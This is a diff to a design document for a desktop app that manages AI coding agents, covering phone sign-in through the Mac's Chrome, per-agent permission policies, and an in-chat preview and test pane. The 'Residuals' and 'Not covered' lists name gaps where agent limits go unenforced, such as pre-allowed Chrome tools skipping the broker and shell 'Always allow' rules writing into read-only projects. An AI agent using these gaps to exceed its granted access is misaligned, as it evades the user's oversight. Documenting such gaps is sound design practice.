+### Signing in on your Mac from the phone (`agents/phone_signin.rs`)
+
+Owner requirement: when an agent can't get into a site because the Mac's
+Chrome isn't signed in, the user can do that sign-in **from the phone**,
+instead of being told to go to the computer. A login card with a browser way
+in shows **Sign in from here** on the phone (Mac feature `signin.phone`):
+
+1. `agents.signinBegin {agentId, requestId}`: the Mac starts its own
+   Claude in Chrome MCP server (`claude --claude-in-chrome-mcp`, as the
+   checks do), picks the profile this site was last found in
+   (`browser_profiles`), and opens the site's account page (`probe_url`,
+   which sends a signed-out visitor to its sign-in) in a tab of the app's
+   own, in its own tab group.
+2. The phone polls `agents.signinFrame` about three times a second, one
+   request at a time: a `computer` screenshot of that tab, re-encoded on the
+   Mac as a JPEG at most 1000px wide (well under the socket's 1MB frame).
+3. Taps (in the frame's pixels, scaled back on the Mac), typing, a short
+   list of keys (Tab, Delete, Enter, …; no modifiers, no shortcuts), Up/Down
+   scrolls, Back and Reload go back as `agents.signinInput`. Pinch zooms the
+   picture on the phone only. **Password** hides the field as it's typed.
+4. **Done** (`agents.signinDone`) opens the account page again and reads
+   where it landed (`browser::signed_in`). Signed in: the tab closes and the
+   card answers itself through its browser way in ("Using your browser ·
+   www.figma.com"), so the agent is woken and carries on. Still on a sign-in
+   page: the screen says so and carries on. Can't tell: **Hand it over
+   anyway**.
+
+**Why this mechanism.** (a) Claude in Chrome's own MCP server, which the app
+already drives, has everything needed (`tabs_create_mcp`, `navigate`,
+`computer` screenshot / click / type / key / scroll, `tabs_close_mcp`) and
+reaches the user's real Chrome profile, signed-in cookies and all, with
+nothing new installed. (b) The DevTools Protocol would stream better
+(`Page.startScreencast`), but the user's Chrome has no debugging port, and
+relaunching it with one would expose every tab to anything on the Mac. (c)
+macOS Screen Sharing over Tailscale works for anything, but shows the whole
+screen, needs setup in System Settings and a VNC client, and isn't scoped to
+one site. (a) was chosen; (c) remains the honest fallback for what (a) can't
+do (below).
+
+**Rules** (tested in `phone_signin_tests.rs` and the router's tests):
+- Only through the companion router, so only a paired phone, over the
+  Tailscale route; the phone also refuses to begin or type unless the Mac
+  proved its pinned identity (`secretRouteProblem`, as for a secret). No
+  agent tool reaches it.
+- One session on the Mac at a time; frames and inputs are accepted only from
+  the device that began it (`Table::check`).
+- The tab is shown and driven only on the card's site (its domain:
+  `www.figma.com` → `figma.com` and its subdomains), a sibling the site
+  signs in on (`x.com` → `twitter.com`), or a sign-in provider
+  (`IDP_HOSTS`: Google, Microsoft, Apple, GitHub, Facebook, Slack;
+  `IDP_SUFFIXES`: Okta, Auth0, OneLogin, Duo, JumpCloud tenants), `https`
+  only. Anywhere else the phone sees "outside the sign-in" and no picture,
+  and only Back works. There's no address bar.
+- What's typed is never logged, stored or shown to an agent: `Input`'s
+  `Debug` gives a length; the router doesn't audit any `agents.signin*`
+  call; refusals never quote input; the phone keeps the field in a ref,
+  wipes it on send, on leaving the app and on closing the screen. The audit
+  line is "phone sign-in · figma.com: started / signed in / stopped on the
+  phone / stopped on the Mac / timed out".
+- While it's live, every agent's Claude in Chrome call is refused
+  (`browser_gate::while_phone_signs_in`), so no agent can look at the tab.
+- It ends after five minutes with no input from the phone (looking doesn't
+  count) or twenty in all, on Stop on either device, on Done, and when the
+  phone leaves the screen. The tab closes each time.
+- The desk shows a bar on every conversation, "Your phone is signing in to
+  figma.com", with Stop (`PhoneSigninBar`, event `agents://phone-signin`).
+
+**Not covered / not verified.**
+- Claude in Chrome's own per-site permission prompt opens on the Mac. A site
+  (or sign-in provider) the extension hasn't been allowed on can't be
+  opened from the phone: the call times out after about 30s and the phone
+  says it must be allowed at the Mac once. Seen on this Mac on 2026-11-05
+  while verifying (on example.com).
+- A sign-in that opens a pop-up window ("Sign in with Google" as a popup)
+  opens outside the tab, so it isn't shown; use the site's own email sign-in
+  or a redirect. Passkeys and the macOS / Chrome password manager prompts
+  on the Mac aren't reachable either; a code sent to the phone works.
+- What's typed passes, as it must, through Claude Code's MCP server process
+  and the Claude in Chrome extension on this Mac (local native messaging,
+  `isLocal`); whether either logs tool arguments hasn't been checked.
+- Not yet run end to end against a real sign-in: the screenshot, click and
+  type calls, the coordinate scaling and the frame rate are untested
+  against a live tab, because the extension's prompt blocked the read-only
+  probe (see above). `tabs_context_mcp` / `tabs_create_mcp` / `tabs_close_mcp`
+  in a new group were seen working, and the empty first tab of a new group
+  is reused so nothing is left behind.
+- Agents whose Claude Code settings pre-allow the Chrome tools would skip
+  the broker, and so the refusal; the app's own turns don't.
 
 ### Grants, read vs send, and turns
 
@@ -1367,7 +1914,7 @@ The backend decides, since it knows when a message is recorded and when a turn e
 - A reply or error off screen notifies with the agent's name and the first line. Inside a turn they are held and posted once when it ends, with the latest text. An approval posts at once, with a sound.
 - Bursts across agents are capped (3 per 20s); the rest stay silent but still count.
 - **Mute** (row context menu) stops OS notifications for that agent; a bell-off mark shows in its row. Unread and the badge still count it.
-- **Dock badge** = unread + pending approvals across non-hidden agents. The mode toggle's badge is on whenever any non-hidden agent is waiting or unread. Approval cards don't add to unread; they count as pending until answered.
+- **Dock badge** = how many agents need you, the one count every surface shows: the sidebar's "Needs your OK · N", the review bar in the Chief's chat, the phone's Home bar, tab badge and icon badge (`needsYouCount`, `packages/companion-protocol/src/attention.ts`; Rust mirrors it in `notify::needs_you`, and both run `attention-cases.json`). The Chief counts like anyone; unread replies and usage limits don't. The mode toggle's badge is on whenever any non-hidden agent is waiting or unread. Approval cards don't add to unread; they count as pending until answered.
 - Clicking a notification focuses a window and emits `agents://open`; the app switches to Agents and opens that agent. Focusing a window clears the unread of the agent it shows.
 - Uses `tauri-plugin-notification` (2.8, click reporting on macOS). Not verified in a real build yet: the dev binary posts under another app's identity, so click-through should be checked in a signed build.
 
@@ -1603,7 +2150,15 @@ chats.
   the phone), updating in place, under "Your 16 agents from Grok Bot are
   here, quiet until you say hi. These get them going.", with a bar above the
   composer ("Your team is almost ready · 2 steps left", **Continue**). It
-  counts what's left, never "0 of 4 done", which reads as homework. Steps, in
+  counts what's left, never "0 of 4 done", which reads as homework. The card
+  is an item in the conversation like a message, at the point it was posted
+  (`postedAt`: the import's end, or under the upgrade's line; a setup kept
+  by an earlier build reads it once from the Chief's chat; from an older
+  Mac, after the import's review card and its line), and scrolls up with the
+  history as you talk: what you send next is the newest thing, never the
+  card. **Continue** goes to it (mounting or paging back to it first) and
+  flashes it; the bar goes once it's done (`setupItemIndex` on the desk,
+  `withSetupCard` on the phone). Steps, in
   order, each skippable and reopenable ("Open again"): **Add logins** (one
   row per service with the agents that need it; Add opens their secure
   cards in place), **Switch on routines** (each with when and what, a
@@ -1612,7 +2167,8 @@ chats.
   Chief answers what it can and asks the rest in one batch), **Say hi to
   your team** (one at a time: Say hi sends a short hello as the user's
   message; others wait while one replies). Progress counts steps, never
-  requests. Finished, it becomes one line, "Your team is set up." (Hide).
+  requests. Finished, it becomes one line where it was, "Done · Your team
+  is set up." (Hide).
   Put away, ⌘K "Continue setting up your team" and a row at the top of
   What's in flight bring it back.
 - **Only choices are kept** (`<agents root>/team-setup.json`: agents, who was
@@ -1621,7 +2177,7 @@ chats.
   logins are left out of the requests bar's counts, What's in flight's
   Needs your OK, the sidebar's rows and its "Needs your OK · N" row
   (`withoutHeldLogins`), and the dock and phone push badges
-  (`team_setup::held_logins`): the checklist holds them, so an import of
+  (`team_setup::hold`, which also holds the agents not met yet): the checklist holds them, so an import of
   sixteen agents isn't sixteen amber rows. The import's line in the Chief's
   chat names four agents "and 12 more", not all sixteen. A second import before the first
   is finished joins the same checklist.
@@ -2610,6 +3166,58 @@ time. The e2e Codex scenarios run on the account when one is signed in.
   that reports no cost adds tokens only, and a period containing one shows no
   dollar figure at all. The editor shows "This week" and "All time".
 
+## What each agent can do (`agents/policy.rs`, `agents/policy_card.rs`)
+
+One policy per agent, inheriting from a team default (`access.json` beside
+the agents; the team's independence stays in `independence.json`). Each
+dimension is the team's unless the agent has its own; rules add up (team's,
+then its own).
+
+| Dimension | Values | Enforced by |
+| --- | --- | --- |
+| Projects | all / listed / none; how in the one it's set to work in: read-only, its own copy, directly; other projects: read or change | the app: `--add-dir` / Codex writable roots carry only writable projects; `Edit(/<project>/**)` deny rules (Codex: read-only paths) for a read-only working folder or a copy's original; the broker refuses edits outside them and reads of projects out of scope (`policy::verdict` in `mcp::decide`); project tools refuse sessions/push where it may only look (`sessions::call`); copies follow `how` (mirrored to `work_directly`) |
+| Folders | paths, read or read-and-change | writable ones are added to the turn; reads in the others pass the broker without a card, writes are refused |
+| Apps | all / only some / none | the broker refuses `mcp__<app>__*` calls; the relay refuses a connection (`Connection::grant_for` reads the policy) |
+| Browser | yes / no | `--no-chrome` (mirrored to `reach.browser_off`, which the access chain's browser reads) and the broker |
+| Independence | team's or its own level | prompt only (`policy::independence_for`; outside text still never goes hard) |
+| Admin | may propose for others (Chief by default) | `propose_settings_change` |
+| Rules | free text | prompt only, and every UI line and card says so |
+
+**Presets.** "I trust my agents" (direct, every app, browser, Go hard),
+**Balanced** (exactly the old behaviour, the default), "Locked down" (read
+projects only, no apps, no browser, Check with me often). "Reset everyone to
+…" sets the team and clears every agent's own settings (admin role kept);
+"everyone" with one field clears only that field. "Make X like Y" copies Y's
+own settings (not its admin role).
+
+**Upgrade, no widening.** The first load writes `access.json` from what the
+app did: Balanced team, each "Work directly" and each removed browser as that
+agent's own setting.
+
+**Chat first.** `propose_settings_change {agents, changes, why}` (any agent
+for itself; admins for others and the team) puts "Change Hiring's settings?"
+in the proposer's chat: one group of plain sentences per set of agents
+changed the same way. Nothing changes until Allow (`policy_card::answer_card`,
+desk or phone); the card keeps the policy's version, so a stale card applies
+nothing. Changes that would strand an open copy or the project an agent works
+in are refused up front. A turn answering outside text can't propose. Every
+agent's prompt carries "What you may do", its rules, and "never tell the user
+to go to Settings".
+
+**UI.** Edit agent → "What it can do" (lines with Team default / Its own /
+instructions, quick menus, "Change in chat"); Settings → Agents → "What agents
+can do" (presets, Reset everyone, ⌘K "What agents can do…"); phone: read-only
+"What it can do" (`agents.policy`) with "Change in chat", and the card.
+
+**Residuals (not enforced).** Shell commands still go through the usual card,
+and an "Always allow" rule for one (e.g. `npm run build`) can write into a
+read-only project; Claude Code reading outside its folders without asking is
+not verified here, so read-scope is only as strong as that prompt; on Codex,
+reads aren't limited and apps are limited only for connections served here;
+take-over ignores the policy (the person at the keyboard answers). Seams: the
+Admin work should set/read `policy::is_admin`; Go-hard auto-allow should read
+`policy::independence_for`.
+
 ## Access
 
 An agent can do what your user account can do: it runs as you, with your files,
@@ -2898,8 +3506,9 @@ chat.
 
 - **Preview, when it names a project.** `project` is a project's name from
   `project_list`, resolved against the real list (an unknown one shares
-  nothing) and stored as its path. The desk's card then offers Preview, which
-  opens the project only when pressed; a revision keeps it. A card riding on
+  nothing) and stored as its path. The desk's card then offers Preview and
+  Test it, which open it in a pane beside the chat only when pressed (see
+  "Preview beside the chat"); a revision keeps it. A card riding on
   a change card shows that card's Preview instead. The phone ignores it.
 
 - **Only what exists.** `items` are files (`path`) or links (`url`). A file
@@ -3067,7 +3676,8 @@ can't trample each other. The UI says "a copy of acme-site", "Keep changes",
   agent before it prepares its copy, so a Keep can't remove the folder a turn
   is about to start in. Both name the copy, so a stale card can't act on a
   newer one.
-- **Preview** opens the copy as a workspace project; **Open a pull request**
+- **Preview** opens the copy in the pane beside the chat (Open in workspace
+  from there opens it as a workspace project); **Open a pull request**
   opens it and queues the workspace's own Submit for review modal
   (`lib/reviewHandoff.ts`), which only creates the PR when the user submits.
 - **Cleanup** (agent deleted, launch sweep): what's pending is committed to the
@@ -3093,6 +3703,68 @@ can't trample each other. The UI says "a copy of acme-site", "Keep changes",
 - Not built: a `start_task` tool to begin a fresh copy mid-conversation; the
   sidebar and dashboard still count agent copies as ordinary worktrees; the
   agent's project `session_*` tools still drive the user's own folder.
+
+## Preview beside the chat, and Test it (`src-tauri/src/agents/preview_test.rs`)
+
+**Preview** on a result card with a project, or on a copy card, opens a pane
+beside the chat (`components/agents/AgentPreviewPane.tsx`) instead of moving
+the window to the workspace. **Open in workspace** is the secondary action.
+Older cards get it too: only `result.project` or `changes` is needed.
+
+- **Which folder**: decided from the card as the log has it
+  (`agents_preview_target` → `preview_test::resolve`), never from a path the
+  client names. A live copy's card shows the copy (its own dev port, seeded at
+  creation); a kept or discarded copy's card, a plain change card or a result
+  shows the project, which must still be one of the user's projects.
+- **Port**: a server already up in this app wins, else the folder's saved
+  port, else the usual per-folder one (`pick_port`, `preferredPortForProject`).
+- **Starting**: through the window's own dev-server owner (App's
+  `useDevServer`, passed down as `AgentPreviewServer`), so the install gate and
+  the "run this project's commands?" consent are the same ones; the pane shows
+  the consent prompt in place, "needs its dependencies installed first" with
+  Open in workspace, "has no web preview", or a calm "Starting <name>…".
+- **The frame**: the workspace preview's own plumbing (`usePreviewConnection`:
+  proxy, injected inspector, health checks) with a smaller toolbar: Back (pages
+  this pane visited), the address (paths on this site only;
+  `parsePreviewAddress` refuses other hosts), Reload, and a width. What the page
+  itself loads is the page's business, as in the workspace preview (the one
+  place the webview loads a project's content).
+- **Routing**: the pane registers itself (`agents_preview_attach`, one per
+  window); `agent_bridge::dispatch_tool` sends that folder's preview tools to
+  it (`target: "pane"`; the workspace listener ignores those, the pane answers
+  nothing else). The pane registers with no agent CLI.
+
+**Test it** (pane header, or on the result card, which opens the pane and
+starts once the site is up) records "Test it in the preview" as your message
+and asks the agent (`test_prompt`) to click through the site while you watch.
+
+- **Tools**: `test_open`, `test_click`, `test_type`, `test_scroll`,
+  `test_viewport`, `test_page`, `test_console`, `test_network`,
+  `test_screenshot`, `test_note`, `test_report` — listed only while the user's
+  run is open, only for that folder, refused once the pane is closed or the
+  run stopped. They run the existing preview bridge tools against the pane.
+  Clicking around your own localhost is local work: like Go hard's local work,
+  no card, at any level (they're app tools, reachable only after you pressed
+  Test it). Everything else in that turn is under the usual rules.
+- **Steps are observed**: each action becomes a step in the app's words
+  ("Opened /pricing", "Clicked “Sign up”", "Couldn't click …" when it matched
+  nothing); typed values never show; `test_note` is the agent's own line
+  ("Form showed an error"). Steps stream to the pane (`agents://preview-test`).
+  Screenshots are copied into `attachments/<run id>/` (8 at most).
+- **The report** (`test_report`: outcome, summary, what's broken) becomes a new
+  version of the card, staged for the turn's end like `share_result`. Console
+  errors on it are read from the preview's own capture since the run began
+  (`preview_console` with `since`). A live copy's card stays a change card, so
+  Keep / Discard carry over to the newest version. A copy card without a result
+  gets a first one ("Tested <project>"). Too much is refused, never trimmed.
+- **Nothing goes silent**: a test turn that ends without a report leaves "The
+  test stopped before it reported back."; closing the pane stops the run.
+- **Phone**: the card shows the outcome, what's broken and the screenshots as a
+  swipeable strip, and **Watch live** (docs/mobile.md).
+- Not verified: a full Test it turn against a real engine and dev server in
+  the running app (the parts are unit-tested and the pane is seen in the UI
+  harness against a fictional site); a report staged in the same turn as a
+  `share_result` replaces it.
 
 ## The Chief's audit trail and live hand-offs
 
